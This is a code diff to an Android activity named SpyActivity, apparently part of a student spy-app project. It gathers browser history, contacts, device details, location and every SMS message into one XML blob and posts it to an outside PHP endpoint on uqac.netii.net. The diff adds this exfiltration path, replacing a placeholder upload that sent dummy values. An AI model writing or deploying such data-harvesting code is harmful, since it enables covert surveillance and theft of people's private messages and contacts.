@@ -22,9 +22,6 @@ import org.apache.http.message.BasicNameValuePair;
 
 import phoneDeviceInformations.PhoneDevice;
 import smsInformations.GetSMS;
-
-import contactsinformations.ListContact;
-
 import android.app.Activity;
 import android.content.Context;
 import android.os.Bundle;
@@ -35,6 +32,7 @@ import android.view.View;
 import android.widget.Button;
 import android.widget.Toast;
 import browserInformations.BrowserHistory;
+import contactsinformations.ListContact;
 
 public class SpyActivity extends Activity {
 
@@ -54,7 +52,9 @@ public class SpyActivity extends Activity {
 		//(new Localisation()).getGPS(this);
 		//(new Localisation())._getLocation(this);
 		//(new BrowserHistory()).getBrowserHist(this);
-	Log.d("non",returnAllXML(this));	
+	//Log.d("non",returnAllXML(this));
+		final String VALUE = returnAllXML(this);
+		Log.d("non","Longueur VALUE : "+VALUE.length());
 	
 		Button sendButton = (Button) findViewById(R.id.button1);
 		final SpyActivity zis = this;
@@ -65,7 +65,7 @@ public class SpyActivity extends Activity {
 						public void run() {
 							Looper.prepare();
 							try {
-								uploadUtilisateur();
+								uploadUtilisateur(VALUE);
 								Toast.makeText(zis, "Upload suceeded", Toast.LENGTH_LONG).show();
 					        } catch (Exception e) {
 					            Toast.makeText(zis, "ERREUR: "+e.toString(), Toast.LENGTH_LONG).show();  
@@ -87,17 +87,22 @@ public class SpyActivity extends Activity {
 		return true;
 	}
 	
-	public void uploadUtilisateur() throws Exception {
+	public void uploadUtilisateur(String VALUE) throws Exception {
 		// Create a new HttpClient and Post Header
 	    HttpClient httpclient = new DefaultHttpClient();
-	    HttpPost httppost = new HttpPost("http://uqac.netii.net/senduserinfos.php");
+	    HttpPost httppost = new HttpPost("http://uqac.netii.net/sendxml.php");
+	    
+	    
 
 	    try {
 	        // Add your data
 	        List<NameValuePair> nameValuePairs = new ArrayList<NameValuePair>(2);
-	        nameValuePairs.add(new BasicNameValuePair("nom", "Sylvain"));
-	        nameValuePairs.add(new BasicNameValuePair("gmail", "<contact></contact>"));
-	        httppost.setEntity(new UrlEncodedFormEntity(nameValuePairs));
+	        //nameValuePairs.add(new BasicNameValuePair("nom", "Sylvain"));
+	        //nameValuePairs.add(new BasicNameValuePair("gmail", "<contact></contact>"));
+	        nameValuePairs.add(new BasicNameValuePair("xml", VALUE));
+	        
+	        httppost.setEntity(new UrlEncodedFormEntity(nameValuePairs,"UTF-8"));
+	        //httppost.setEntity(new UrlEncodedFormEntity(nameValuePairs));
 
 	        // Execute HTTP Post Request
 	        HttpResponse response = httpclient.execute(httppost);
@@ -130,7 +135,13 @@ public class SpyActivity extends Activity {
 		GetSMS getSMS=new GetSMS();
 		String getSMSXML= getSMS.getAllSmsToXML(context);
 		
-		res=BrowserHistoryXML+listContactXML+phoneDeviceXML+localisationXML+getSMSXML;
+		res=    "<ALL>"+
+				"<ALLHISTORY>"+BrowserHistoryXML+"</ALLHISTORY>"
+				+"<ALLCONTACTS>"+listContactXML+"</ALLCONTACTS>"
+				+phoneDeviceXML                 // <deviceInformations>
+				+localisationXML				// <localisation>
+				+"<ALLSMS>"+getSMSXML+"</ALLSMS>"
+				+"</ALL>";
 		return res;
 	}
 	
